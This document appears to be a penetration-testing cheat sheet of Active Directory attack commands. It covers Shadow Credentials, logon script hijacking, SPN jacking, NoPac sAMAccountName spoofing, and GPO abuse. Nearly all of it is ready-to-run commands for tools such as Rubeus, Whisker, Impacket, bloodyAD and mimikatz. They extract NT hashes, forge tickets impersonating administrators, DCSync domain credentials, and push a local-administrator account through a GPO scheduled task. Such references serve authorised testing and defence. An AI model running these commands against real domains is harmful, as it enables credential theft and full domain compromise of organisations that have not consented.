## Shadow Credentials

Abuse `msDS-KeyCredentialLink` write access to add a certificate-based credential to a target account, then request a TGT and extract the NT hash without changing the password.

### Check for Existing Key Credentials

```powershell
Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'
.\Whisker.exe list /target:<target>
```

### Add Key Credential (Windows - Whisker)

```powershell
.\Whisker.exe add /target:<target>
.\Rubeus.exe asktgt /user:<target> /certificate:<certificate> /password:"<password>" /domain:<domain> /dc:<dc-hostname> /getcredentials /show
```

### Cleanup

```powershell
.\Whisker.exe remove /target:<target> /deviceid:<deviceid>
.\Whisker.exe clear /target:<target>
```

### Shadow Credentials from Linux (pyWhisker)

```bash
python3 pywhisker.py -d <domain> -u <username> -p <password> --target <target> --action add
python3 gettgtpkinit.py -cert-pfx <certificate> -pfx-pass <password> <domain>/<target> <ccache-file>
KRB5CCNAME=<ccache-file> python3 getnthash.py -key <key> <domain>/<target>
KRB5CCNAME=<ccache-file> smbclient.py -k -no-pass <dc-hostname>
```

### Get ACEs on a Target

```powershell
Get-DomainObjectAcl -Identity <target>
```

```bash
python3 examples/dacledit.py -principal <username> -target <target> -dc-ip <dc-ip> '<domain>'/'<username>':'<password>'
```

---

## Logon Script Abuse

If you have `WriteProperty` over the `scriptPath` attribute of a user account, you can set their logon script to a path you control in NETLOGON.

### Set scriptPath (bloodyAD)

```bash
bloodyAD --host "<dc-ip>" -d "<domain>" -u "<username>" -p '<password>' set object <target-user> scriptPath -v '<path>'
bloodyAD --host "<dc-ip>" -d "<domain>" -u "<username>" -p '<password>' get object <target-user> --attr scriptPath
```

### Set scriptPath (PowerView)

```powershell
Set-DomainObject <target-user> -Set @{'scriptPath'='<path>'}
Get-DomainObject <target-user> -Properties scriptPath
```

### Check NETLOGON Permissions

```bash
smbcacls //<dc-ip>/NETLOGON <dir> -U <username>%'<password>'
```

```powershell
ls $env:LOGONSERVER\NETLOGON
icacls $env:LOGONSERVER\NETLOGON\<dir>
```

### Enumerate with PywerView

```bash
pywerview get-objectacl --name '<target-user>' -w <domain> -t <dc-ip> -u '<username>' -p '<password>' --resolve-sids --resolve-guids
```

### ScriptSentry - Find Misconfigured Logon Scripts

```powershell
.\Invoke-ScriptSentry.ps1
```

### Collect AD Data with Adalanche

```bash
./adalanche-linux-x64 collect activedirectory --domain <domain> --server <dc-ip> --username '<username>' --password '<password>'
./adalanche-linux-x64 analyze --datapath <datapath>
```

---

## SPN Jacking

If you have `WriteSPN` over a computer that is configured for constrained delegation to an orphaned (deleted) SPN, you can hijack that delegation to forge tickets as a privileged user.

### Find WriteSPN Rights (BloodHound Cypher)

```cypher
MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p
```

### Find WriteSPN Rights (PowerView)

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID <username>)}
```

### List Computers with Constrained Delegation

```powershell
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```

### Find Orphaned SPNs

```powershell
Get-ConstrainedDelegation -CheckOrphaned
```

### Assign Orphaned SPN to Target (Hijack)

```powershell
Set-DomainObject -Identity <target> -Set @{serviceprincipalname='<SPN>'} -Verbose
```

### S4U Attack to Forge Ticket

```powershell
.\Rubeus.exe s4u /domain:<domain> /user:<username> /rc4:<hash> /impersonateuser:<admin-user> /msdsspn:"<SPN>" /nowrap
.\Rubeus.exe tgssub /ticket:<base64> /altservice:<service>
```

### Cleanup SPNs

```powershell
Set-DomainObject -Identity <target> -Clear 'serviceprincipalname' -Verbose
```

### From Linux with proxychains

```bash
proxychains4 -q findDelegation.py -target-domain <domain> -dc-ip <dc-ip> -dc-host <dc-hostname> <domain>/<username>:<password>
proxychains4 -q python3 addspn.py <dc-ip> -u '<domain>/<username>' -p <password> --clear -t '<target>'
proxychains4 -q getST.py -spn '<SPN>' -impersonate <admin-user> '<domain>/<account>' -hashes :<hash> -dc-ip <dc-ip>
proxychains4 -q python3 tgssub.py -in <ticket-file> -altservice "<service>" -out <new-ticket-file>
describeTicket.py <ticket-file>
KRB5CCNAME=<ticket-file> smbexec.py -k -no-pass <target>
```

---

## sAMAccountName Spoofing (NoPac / CVE-2021-42278/42287)

Create a machine account, rename it to match a DC name (without trailing $), request a TGT, then request a service ticket as Administrator via S4U2self.

### Scan for Vulnerability

```powershell
.\noPac.exe scan -domain <domain> -user <username> -pass <password>
```

```bash
python3 noPac/scanner.py -dc-ip <dc-ip> <domain>/<username>:<password> -use-ldap
```

### Check MachineAccountQuota

```powershell
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"
```

### Create Machine Account (PowerMad)

```powershell
New-MachineAccount -MachineAccount "<account>" -Password $password -Domain <domain> -DomainController <dc-ip>
```

### Clear SPNs and Rename to DC Name

```powershell
Set-DomainObject -Identity '<account>$' -Clear 'serviceprincipalname' -Domain <domain> -DomainController <dc-ip>
Set-MachineAccountAttribute -MachineAccount "<account>" -Value "<dc-hostname>" -Attribute samaccountname -Domain <domain> -DomainController <dc-ip>
```

### Request TGT, Restore Name, Request S4U2self Ticket

```powershell
.\Rubeus.exe asktgt /user:<dc-hostname> /password:<password> /domain:<domain> /dc:<dc-ip> /nowrap
# Restore sAMAccountName back to original
.\Rubeus.exe s4u /self /impersonateuser:<admin-user> /altservice:"<service>/<dc-hostname>" /dc:<dc-ip> /ptt /ticket:<ticket>
```

### From Linux (bloodyAD + Impacket)

```bash
python3 bloodyAD.py -d <domain> -u <username> -p <password> --host <dc-ip> get object <account>
python3 bloodyAD.py -d <domain> -u <username> -p <password> --host <dc-ip> set object <account> <attribute>
getTGT.py <domain>/<username>:<password> -dc-ip <dc-ip>
KRB5CCNAME=<ticket-file> getST.py <domain>/<username> -self -impersonate <admin-user> -altservice <service> -k -no-pass -dc-ip <dc-ip>
KRB5CCNAME=<ticket-file> psexec.py <dc-hostname> -k -no-pass
```

### Mimikatz DCSync After Compromise

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:<domain> /kdc:<dc-hostname> /user:<username>" exit
```

---

## GPO Attacks

If you have modification rights over a GPO that is linked to an OU containing computers or users, you can use it to execute arbitrary commands.

### Enumerate GPO Rights

```powershell
$userSID = ConvertTo-SID <username>
Get-DomainGPO
Get-DomainObject -SearchScope Base -Properties gplink
Get-DomainObjectAcl -ResolveGUIDs
ConvertFrom-SID S-1-5-21-...
Get-DomainGroupMember "<group-name>"
Get-DomainSite -Properties gplink
Get-DomainOU | select name, gplink
Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }
```

### Create and Link a GPO

```powershell
New-GPO -Name TestGPO -Comment "This is a test GPO."
New-GPLink -Name TestGPO -Target "OU=TestOU,DC=<domain>,DC=local"
```

### Find GPOs You Can Modify

```powershell
Get-GPOEnumeration
```

### SharpGPOAbuse - Add Local Admin

```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "Default Security Policy - WKS"
```

### GPOwned from Linux (via proxychains)

```bash
proxychains4 -q python3 GPOwned.py -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -gpcmachine -listgpo
proxychains4 -q python3 GPOwned.py -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -gpcmachine -listgplink
proxychains4 -q python3 examples/dacledit.py <domain>/<username>:<password> -target-dn "CN={<GPO-GUID>},CN=Policies,CN=System,DC=<domain>,DC=local" -dc-ip <dc-ip>
proxychains4 -q python3 GPOwned.py -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -gpcmachine -backup backupgpo -name "{<GPO-GUID>}"
proxychains4 -q python3 pygpoabuse.py <domain>/<username>:<password> -gpo-id <GPO-GUID> -command "net user <newuser> <password> /add && net localgroup Administrators <newuser> /add" -taskname "PT_LocalAdmin" -dc-ip <dc-ip> -v
```
